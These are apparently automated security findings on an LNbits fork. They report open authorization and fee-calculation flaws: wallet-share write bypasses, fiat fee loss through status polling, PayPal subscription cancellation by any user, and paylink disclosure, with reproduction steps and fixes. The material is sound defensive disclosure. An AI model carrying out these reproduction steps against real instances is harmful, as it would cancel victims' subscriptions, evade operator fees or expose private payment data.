1. Attacker is a registered user whom a wallet owner has invited (or whose access request the owner approved) with view-payments only; this is the attacker's privilege position, not a deployment switch. With the admin key of their own mirror wallet they list the owner's pending invoice hashes via GET /api/v1/payments (permitted by VIEW) and POST /api/v1/payments/cancel for each: the funding source cancels the owner's invoice and the owner's row is marked FAILED. PATCH /extra and PUT /labels write to the owner's rows on every backend. The cancel path is effective only on LND funding sources (lndgrpc/lndrest implement cancel_hold_invoice; base.py raises), hence AT:P; whether LND's CancelInvoice cancels non-hold open invoices is an assumption about the backend (lnd invoicesrpc), owner hold invoices are cancellable in any case.

## Recommended fix
Write and control endpoints (cancel, extra, labels) authorise solely through a lookup helper whose only gate is VIEW_PAYMENTS, so a mirror wallet with read-only share rights obtains the owner's payment rows and the handlers act on them. Fix criteria: Cancel/settle must require the acting wallet to hold RECEIVE_PAYMENTS (or be the source wallet itself) and should refuse records that are not hold invoices; extra and labels updates must require a write-level permission or the owner's own key. Verify a VIEW-only mirror admin key receives 403 on /cancel, /extra and /labels for the source wallet's payments while the owner's key still succeeds.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257380

---

# Fiat payment settled via public status poll loses its service fee, creating unbacked sats

## Details
LNbits has two code paths that settle a pending fiat (Stripe/PayPal/Square/Revolut) payment, and they disagree on the fee.

1. Provider webhook (lnbits/core/views/callback_api.py handle_*_event) calls check_fiat_status(payment) only. check_fiat_status (lnbits/core/services/fiat_providers.py:40-67) marks the payment SUCCESS, credits the operator's fiat service-fee wallet with abs(payment.fee) = F, debits the faucet wallet by the full amount and enqueues the payment. payment.fee stays -F as set by create_fiat_invoice (payments.py:211-228), so the user's balance (SUM(amount - ABS(fee))) is amount-F. Ledger: user (amount-F) + fee wallet (F) - faucet (amount) = 0. tests/api/test_callback_api.py asserts the fee survives this path (payment.fee == -2).

2. Generic pending path: update_pending_payment (payments.py:425-440) -> check_payment_status (payments.py:710-724). The fiat branch calls check_fiat_status (same full settlement, fee wallet credited F) and then returns a bare PaymentStatus(paid=True) with fee_msat=None. update_pending_payment sees success and calls update_payment_success_status (payments.py:1038-1066), which is written for Lightning settlements: it recomputes payment.fee = -(abs(status.fee_msat or 0) + abs(service_fee(payment.amount, internal=False))) and persists it. For the fiat payment fee_msat is None and service_fee() is 0 under the default lnbits_service_fee_wallet=None (or an unrelated Lightning fee otherwise), so the user's row ends with fee=0. Result: user (amount) + fee wallet (F) - faucet (amount) = +F sats credited from nothing; the payer escapes the operator's fiat service fee while the fee wallet is still paid it.

Path 2 is driven by the payer: GET /api/v1/payments/{payment_hash} (payment_api.py:429-470) is unauthenticated and calls update_pending_payment on any pending payment. Any Lightning-wallet invoice-key holder can create a fiat invoice (the allowed_users gate at payments.py:174-180 applies only to FIAT-type wallets), pay it at the provider and poll the endpoint; as soon as the provider API reports paid the poll settles via path 2, before the webhook (which, arriving later, finds payment.success and does nothing). The shipped UI's 'check' button uses the same endpoint, and the periodic check_pending_payments task (crud/payments.py:174-177 does not exclude fiat_ rows) takes the same path, so the fee is also lost silently whenever either settles a fiat payment first. If the provider webhook is not configured, path 2 is the only settlement path and the fee is lost on every fiat payment.

Precondition: the operator has configured a fiat service fee (service_fee_wallet_id and service_fee_percent for the provider) — the feature this bug bypasses. Tests assert fee <= 0 only at creation and never after update_pending_payment.

## Evidence
1. [lnbits/core/services/payments.py:710–723](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L710-L723)
   check_payment_status: for an internal incoming payment with fiat_provider (checking_id 'fiat_…' is_internal per models/payments.py) it calls check_fiat_status, which fully settles the payment, and then returns a bare PaymentStatus(paid=fiat_status.paid) with fee_msat=None. The caller cannot tell this payment is already settled with a fiat fee, and proceeds to a second, Lightning-style settlement. This is the code the fix must change (return the settled payment's fee or short-circuit).
2. [lnbits/core/services/payments.py:1038–1065](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1038-L1065)
   update_payment_success_status recomputes payment.fee = -(abs(status.fee_msat or 0) + abs(service_fee(payment.amount, internal=False))) and persists it with update_payment (db.update writes every non-no_database field, including fee). For the fiat payment status.fee_msat is None and service_fee() is 0 under the default lnbits_service_fee_wallet=None, so the fiat fee set at creation is overwritten with 0.
3. [lnbits/core/services/payments.py:425–439](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L425-L439)
   update_pending_payment calls check_payment_status and, because the returned status is success, calls update_payment_success_status on the same (already settled) payment object, triggering the fee overwrite.
4. [lnbits/core/services/fiat\_providers.py:40–66](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/fiat_providers.py#L40-L66)
   check_fiat_status is the complete fiat settlement: sets status SUCCESS, persists, credits the fee wallet with abs(payment.fee) (the fiat fee F, still on the object at this point), debits the faucet wallet by abs(payment.amount), enqueues the payment, and returns success. The webhook handlers (callback_api.py handle_*_event) call only this function, so on that path the user's row keeps fee=-F and the ledger balances.
5. [lnbits/core/views/payment\_api.py:429–469](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L429-L469)
   GET /api/v1/payments/{payment_hash} needs no key: for any pending payment it calls update_pending_payment, so the payer can drive the double settlement the instant the provider reports paid, ahead of the webhook. The shipped UI's own 'check' button (lnbits-payment-list.js checkPayment → api.js getPayment) hits the same endpoint.
6. [lnbits/core/services/payments.py:211–227](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L211-L227)
   create_fiat_invoice stores fee = -abs(service_fee_fiat(amount, provider)) on the user's row; wallet balance is SUM(amount - ABS(fee)) (crud/payments.py:479, 538), so this fee is what deducts the operator's fiat service fee from the user's credit.
7. [lnbits/core/crud/payments.py:174–176](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L174-L176)
   exclude_uncheckable excludes only temp_ and internal_ checking ids, so the periodic check_pending_payments task (default every 1800 s, settings.lnbits_funding_source_pending_interval_seconds) also runs update_pending_payment on fiat_ rows and applies the same overwrite whenever it settles a fiat payment before the webhook does.

## Impact
Integrity of the apipayments ledger: per fiat payment settled through the polling path, the fiat service fee F is credited twice (user keeps it, fee wallet receives it) while the faucet is debited once, so the operator's funds are diluted by F per payment and the configured fiat service fee is bypassable by any payer. Bounded per payment by the fee percentage/cap the operator configured; no confidentiality or availability effect.

## Reproduction steps
1. Attacker: a self-registered user holding an invoice key for a Lightning wallet on an instance with a fiat provider enabled and a fiat service fee configured. Steps: POST /api/v1/payments with fiat_provider to create a fiat invoice for X fiat (fee -F stored); pay it at the provider; poll the unauthenticated GET /api/v1/payments/{payment_hash} continuously. When the provider API reports paid, the poll runs update_pending_payment: check_fiat_status credits the fee wallet F and debits the faucet, then update_payment_success_status overwrites the user's fee with 0, so the user is credited the full amount. The poll must observe paid before the provider webhook does (AT:PRESENT); the attacker controls the poll rate and the payer is redirected to the success URL at the same moment the provider marks the session paid, so the race is winnable and repeatable per payment. No user interaction beyond the attacker's own actions.

## Recommended fix
The generic pending-payment path settles a fiat payment twice: check_payment_status lets check_fiat_status perform the full fiat settlement (fee-wallet credit, faucet debit) and then reports a fee-less success status, so update_pending_payment applies update_payment_success_status with Lightning fee semantics and overwrites the fiat fee stored on the user's row. Fix criteria: A fiat payment is settled exactly once with its fiat fee preserved, whichever observer (provider webhook, GET /api/v1/payments/{hash}, periodic check_pending_payments) sees the paid state first. After settlement via any path the persisted payment.fee equals the fee computed by service_fee_fiat at creation, and user credit + fee-wallet credit - faucet debit sums to zero. Verify with a test that settles a fee-bearing fiat payment through GET /api/v1/payments/{hash} and asserts the persisted fee and the three wallet balances.

---
**Severity:** LOW
**Status:** Open
**Category:** Incorrect calculation
**CWE:** [CWE-682](https://cwe.mitre.org/data/definitions/682.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257192

---

# PayPal cancel_subscription ignores ownership correlation id; any wallet can cancel any subscription

## Details
`DELETE /api/v1/fiat/{provider}/subscription/{subscription_id}` (lnbits/core/views/fiat_api.py:170-185, cancel_subscription) is authenticated only by `require_admin_key`, i.e. the admin key of any wallet, including a self-registered user's own wallet. It passes the path parameter verbatim to `FiatProvider.cancel_subscription(subscription_id, key_type.wallet.id)`; the only gate in `get_fiat_provider` is the global `settings.paypal_enabled` flag (lnbits/fiat/__init__.py:46-51, settings.py:847-848) - `paypal_limits.allowed_users` is not consulted on this route. The base contract (lnbits/fiat/base.py:185-191) states that `correlation_id` is "used to verify that the subscription belongs to the user that made the request", and the project enforces exactly that for Revolut (lnbits/fiat/revolut.py:304-312 refuses when the stored `wallet_id` differs from `correlation_id`; tests/unit/test_fiat_providers.py:1449 requires that refusal).

`PayPalWallet.cancel_subscription` (lnbits/fiat/paypal.py:236-259) performs no ownership check at all. It obtains an OAuth token with the operator's PayPal client credentials and POSTs `/v1/billing/subscriptions/{subscription_id}/cancel` for the caller-supplied id; `correlation_id` appears only inside the free-text `reason` field. On success PayPal cancels the subscription irreversibly.

Consequently, on an instance where the PayPal fiat provider is enabled, any LNbits user holding the admin key of their own wallet can cancel any PayPal billing subscription in the operator's PayPal business account - another wallet owner's subscriptions and subscriptions unrelated to LNbits - provided they know its PayPal id (`I-XXXXXXXXXXXX`). Those ids are not secret-grade: create_subscription returns PayPal's id as `subscription_request_id` (paypal.py:228), the webhook handler stores it in the receiving wallet's payment `extra.subscription_request_id` (core/views/callback_api.py:273-276), and the paying customer sees it in PayPal receipts and their PayPal account.

The data needed to enforce ownership exists: create_subscription serialises the wallet id into the PayPal subscription's `custom_id` (paypal.py:206, 347-363), so the cancel path could GET the subscription and compare `custom_id[0]` with `correlation_id`, or resolve the id from LNbits' own stored payments for the caller's wallet. It does neither.

## Evidence
1. [lnbits/fiat/paypal.py:236–259](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/paypal.py#L236-L259)
   cancel_subscription POSTs /v1/billing/subscriptions/{subscription_id}/cancel under the operator's OAuth credentials for whatever subscription_id the caller passes. correlation_id (the caller's wallet id) is used only inside the free-text 'reason' string; no lookup or comparison establishes that the subscription belongs to that wallet.
2. [lnbits/core/views/fiat\_api.py:170–185](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/fiat_api.py#L170-L185)
   DELETE /api/v1/fiat/{provider}/subscription/{subscription_id} requires only a wallet admin key (any self-registered user's own wallet), does not consult paypal_limits.allowed_users, and passes the path parameter straight to the provider with key_type.wallet.id as the correlation id; it relies entirely on the provider to enforce ownership.
3. [lnbits/fiat/base.py:178–192](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/base.py#L178-L192)
   The FiatProvider contract documents correlation_id as the identifier 'used to verify that the subscription belongs to the user that made the request'; the PayPal implementation does not implement that check.
4. [lnbits/fiat/revolut.py:298–312](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/revolut.py#L298-L312)
   The project's own standard for this contract: the Revolut implementation fetches the subscription, deserialises its stored wallet_id and returns 'Subscription not found.' when it differs from correlation_id (enforced by tests/unit/test_fiat_providers.py:1449). PayPal lacks the equivalent step.
5. [lnbits/fiat/paypal.py:181–234](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/paypal.py#L181-L234)
   create_subscription embeds the wallet id in the PayPal subscription's custom_id and returns the PayPal subscription id (data['id']) as subscription_request_id, so the information needed to verify ownership exists on the PayPal object but is never consulted on cancel.
6. [lnbits/core/views/callback\_api.py:271–281](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/callback_api.py#L271-L281)
   The PayPal webhook handler stores the PayPal subscription id (billing_agreement_id) in the receiving wallet's payment extra as subscription_request_id, showing the id circulates in LNbits payment data and merchant/customer records rather than being a secret.

## Impact
LNbits acts as a confused deputy: the user-to-user isolation the FiatProvider contract promises for subscriptions is broken, and another wallet owner's recurring revenue stream is terminated. No LNbits data is disclosed and the apipayments ledger is not directly altered, so integrity impact is limited. Subsequent-system impact: The operator's PayPal business account lies outside LNbits' boundary: the code demonstrably issues a cancel for an attacker-chosen subscription id under the operator's credentials, irreversibly cancelling a third party's recurring payment, including subscriptions that have nothing to do with LNbits. Scope per request is one known subscription.

## Reproduction steps
1. Attacker: any self-registered LNbits user holding the admin key of their own wallet (require_admin_key). Conditions outside their control: the operator has enabled the PayPal fiat provider (settings.paypal_enabled with client credentials), and the attacker knows the victim's PayPal subscription id (not enumerable - 'I-' plus 12 alphanumerics - but returned to the subscribing wallet, stored in payment extras, and shown in PayPal receipts and the payer's account), hence AT:P. The attacker sends a single DELETE /api/v1/fiat/paypal/subscription/<victim-id> with their key; LNbits cancels it using the operator's PayPal credentials. No victim interaction, no race.

## Recommended fix
PayPalWallet.cancel_subscription never verifies that the PayPal subscription identified by subscription_id belongs to the wallet identified by correlation_id, contrary to the FiatProvider contract that the Revolut implementation honours. Fix criteria: Before calling PayPal's cancel endpoint, the implementation must establish ownership: fetch the PayPal subscription and require the wallet id serialised in its custom_id to equal correlation_id, or resolve the subscription from LNbits' own stored payments for that wallet and refuse unknown ids. A request from wallet A naming a subscription created for wallet B (or any id not created through LNbits) must be rejected with no call to the cancel endpoint, matching the behaviour tests/unit/test_fiat_providers.py enforces for Revolut.

---
**Severity:** LOW
**Status:** Open
**Category:** Insecure direct object reference
**CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257190

---

# Shared wallet mirror discloses owner's LNURL pay-link history to grantees without view permission

## Details
Wallet sharing grants a subset of three permissions (view-payments, receive-payments, send-payments) chosen by the owner in invite_to_wallet / update_wallet_share_permissions. The project treats view-payments as the gate for reading the owner's payment data: get_payments_paginated (lnbits/core/crud/payments.py:142-144) returns nothing for a mirror wallet without it, and _only_user_wallets_statement includes only can_view_payments wallets.

Wallet.mirror_shared_wallet (lnbits/core/models/wallets.py:167-172), applied by get_source_wallet on every read of a lightning-shared mirror wallet (get_wallet, get_wallets, get_wallets_paginated, get_wallets_ids, get_wallet_for_key), copies the source wallet's stored_paylinks onto the mirror as soon as share_permissions is non-empty. It never consults VIEW_PAYMENTS. stored_paylinks is populated by _store_paylink (lnbits/core/services/lnurl.py:316-366) with every non-disposable LNURL-pay / lightning-address destination the owner has paid, its metadata label, and a last_used timestamp refreshed on each payment. A grantee given only receive-payments (e.g. a cashier allowed to generate invoices) therefore obtains, via GET /api/v1/wallets, GET /api/v1/auth and GET /api/v1/wallet/paginated (session), and in the wallet UI's 'Stored paylinks' panel, the owner's list of payees and when each was last paid: outgoing-payment metadata that the payments endpoint deliberately withholds from the same grantee.

Scope: the mirroring of balance_msat under a receive-only share is asserted by tests/unit/test_services_shared_wallet.py (mirror_wallet.balance == 100000) and is intended behaviour, so it is not claimed here; currency and lightning_address are receive-side data a receive-capable grantee legitimately needs. The disclosure is read-only; the mirror keeps its own adminkey/inkey, and PUT /api/v1/wallet/stored_paylinks/{id} writes only the mirror's own row, so the owner's list cannot be modified through the mirror.

## Evidence
1. [lnbits/core/models/wallets.py:155–174](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/wallets.py#L155-L174)
   mirror_shared_wallet copies the source wallet's stored_paylinks (and currency, lightning_address, balance_msat, icon, color) onto the grantee's mirror wallet whenever share_permissions is non-empty (line 167). The predicate is 'any permission', not WalletPermission.VIEW_PAYMENTS, so a receive-only (or send-only) share discloses the owner's saved outgoing destinations. This is the line the fix must change.
2. [lnbits/core/crud/wallets.py:343–355](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/wallets.py#L343-L355)
   get_source_wallet applies mirror_shared_wallet on every read of a lightning-shared wallet; it is called from get_wallet, get_wallets, get_wallets_paginated, get_wallets_ids and get_wallet_for_key, so every read path (session and key-based) returns the mirrored data.
3. [lnbits/core/views/api.py:70–79](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/api.py#L70-L79)
   GET /api/v1/wallets serialises user.wallets (built by get_wallets in crud/users.py get_user) as full Wallet models, including stored_paylinks for mirror wallets, to the grantee's session. The same User object is returned by GET /api/v1/auth.
4. [lnbits/core/views/wallet\_api.py:84–104](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/wallet_api.py#L84-L104)
   GET /api/v1/wallet/paginated returns Page[Wallet] from get_wallets_paginated, i.e. the full mirrored Wallet model including stored_paylinks, to the grantee's session; copy_with_keys masks only adminkey/inkey.
5. [lnbits/core/services/lnurl.py:316–365](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/lnurl.py#L316-L365)
   _store_paylink shows what stored_paylinks contains: every non-disposable LNURL-pay / lightning-address destination the owner has paid, with the service's metadata text as label and a last_used timestamp refreshed on each payment. It is therefore outgoing-payment metadata (who the owner pays and when last).
6. [lnbits/core/crud/payments.py:138–144](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L138-L144)
   get_payments_paginated returns an empty page for a mirror wallet that lacks can_view_payments, showing that view-payments is the shipped control for reading the owner's payment data; the stored_paylinks copy acts around that control.
7. [lnbits/templates/components/lnbits-wallet-paylinks.vue:1–9](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/components/lnbits-wallet-paylinks.vue#L1-L9)
   The 'stored_paylinks' panel is rendered whenever storedPaylinks is non-empty, with no check on sharePermissions, so a receive-only grantee also sees the owner's payee list in the wallet UI.
8. [tests/unit/test\_services\_shared\_wallet.py:644–699](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/tests/unit/test_services_shared_wallet.py#L644-L699)
   test_shared_wallet_receive_permission asserts mirror_wallet.balance == 100000 under a receive-only share, so balance visibility with any permission is conceded, intended behaviour and is NOT part of this finding; no test covers the stored_paylinks copy.

## Impact
Confidentiality of another user's outgoing-payment metadata (saved LNURL/lightning-address payees, labels, last-paid timestamps) is lost to a party the owner explicitly did not grant viewing rights, crossing the user-to-user boundary. The data is limited metadata, not payment amounts, keys or funds; no integrity or availability impact.

## Reproduction steps
1. The attacker is an authenticated user who has accepted a share invitation granting receive-payments (and/or send-payments) but not view-payments. Once the mirror exists, a single GET /api/v1/wallets or GET /api/v1/wallet/paginated with the grantee's session returns stored_paylinks; the wallet page shows the same list. The precondition that the owner has shared the wallet with a permission set excluding view-payments is a state the attacker does not control (AT:P).

## Recommended fix
mirror_shared_wallet copies the source wallet's stored_paylinks onto the mirror whenever any share permission is present, instead of requiring the permission that governs reading the owner's payment data (WalletPermission.VIEW_PAYMENTS). Fix criteria: The owner's stored_paylinks must be mirrored only when the share includes view-payments (or a permission the owner explicitly grants for it). Verify that a receive-only mirror returns an empty stored_paylinks list from GET /api/v1/wallets, GET /api/v1/auth and GET /api/v1/wallet/paginated and shows no stored-paylinks panel, while a share including view-payments still receives them; add a unit test alongside test_shared_wallet_receive_permission covering stored_paylinks.

---
**Severity:** LOW
**Status:** Open
**Category:** Incorrect authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257188